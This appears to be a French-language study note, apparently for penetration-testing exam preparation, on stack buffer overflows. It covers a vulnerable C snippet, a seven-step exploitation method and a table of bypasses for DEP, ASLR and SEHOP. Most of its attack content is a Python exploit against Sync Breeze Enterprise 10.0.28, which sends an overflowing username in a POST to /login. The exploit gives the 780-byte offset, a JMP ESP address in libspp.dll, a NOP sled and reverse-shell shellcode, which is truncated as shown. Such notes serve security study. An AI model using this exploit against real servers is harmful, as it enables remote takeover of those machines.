
### 🔍 Analyse technique

  

Le dépassement de tampon sur la pile (stack overflow) consiste à écrire au-delà des limites d’un buffer local alloué sur la pile, jusqu’à écraser **l’adresse de retour** d’une fonction. Cette attaque permet un **contrôle direct du flot d’exécution** via l’EIP/RIP, menant potentiellement à l’exécution de shellcode.

  

### 📘 Code vulnérable de base

  

```c

int main(int argc, char *argv[]) {

    char buffer[64];

    strcpy(buffer, argv[1]); // vulnérabilité : pas de contrôle de taille

    return 0;

}

```


### Visualisation de la pile

```

[ buffer[64]   ]  <- Espace vulnérable

[ saved EBP    ]

[ return addr  ]  <- EIP que l’on peut écraser

```

### 🛠️ Méthodologie d'exploitation

  

1. Crash POC

2. Offset EIP avec `pattern_create`, `pattern_offset`

3. Analyse des badchars

4. Shellcode via `msfvenom`

5. Trouver un JMP ESP (ou créer une ROP chain)

6. Construction du buffer final

7. Test et obtention du shell

### 💥 Exploit : Sync Breeze Enterprise 10.0.28

  

Exploit d’un dépassement de tampon dans une requête POST à `/login`.


```python

#!/usr/bin/python

import socket

import sys

  

try:

    server = sys.argv[1]

    port = 80

    size = 800

  

    filler = b"A" * 780

    eip = b"\x83\x0c\x09\x10"  # JMP ESP dans DLL vulnérable (libspp.dll)

    offset = b"C" * 4

    nops = b"\x90" * 10

  

    shellcode = (

        b"\xdd\xc4\xba\x6d\xdc\x1e\xf1\xd9\x74\x24\xf4\x5e\x29\xc9\xb1"

        b"\x52\x31\x56\x17\x83\xee\xfc\x03\x3b\xcf\xfc..."

    )

  

    payload = filler + eip + offset + nops + shellcode

    content = b"username=" + payload + b"&password=A"

  

    buffer = b"POST /login HTTP/1.1\r\n"

    buffer += b"Host: " + server.encode() + b"\r\n"

    buffer += b"User-Agent: Mozilla/5.0\r\n"

    buffer += b"Accept: */*\r\n"

    buffer += b"Connection: close\r\n"

    buffer += b"Content-Type: application/x-www-form-urlencoded\r\n"

    buffer += b"Content-Length: " + str(len(content)).encode() + b"\r\n"

    buffer += b"\r\n"

    buffer += content

  

    print("Sending evil buffer.")

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    s.connect((server, port))

    s.send(buffer)

    s.close()

    print("Done!")

  

except socket.error:

    print("Could not connect!")

```

  

### 🔖 Détails techniques


- **Offset EIP** : 780 octets (déterminé avec mona)

- **JMP ESP** : dans `libspp.dll` (sans ASLR, sans DEP)

- **Badchars** : `\x00\x0a\x0d`

- **Payload** : shell reverse TCP, encodé


### ⛔️ Mitigations et contournements
  

| Protection    | Contournement                     |

| ------------- | --------------------------------- |

| DEP           | ROP + VirtualAlloc                |

| ASLR          | Modules statiques sans ASLR       |

| SEHOP         | POP POP RET dans DLL sans SafeSEH |

| Stack Cookies | Pas présent ici (pas de **GS**)   |

  
## ⚠️ Erreurs courantes


- Offset mal calculé → EIP partiellement contrôlé

- Shellcode corrompu (badchars)

- DLL choisie avec ASLR activé

  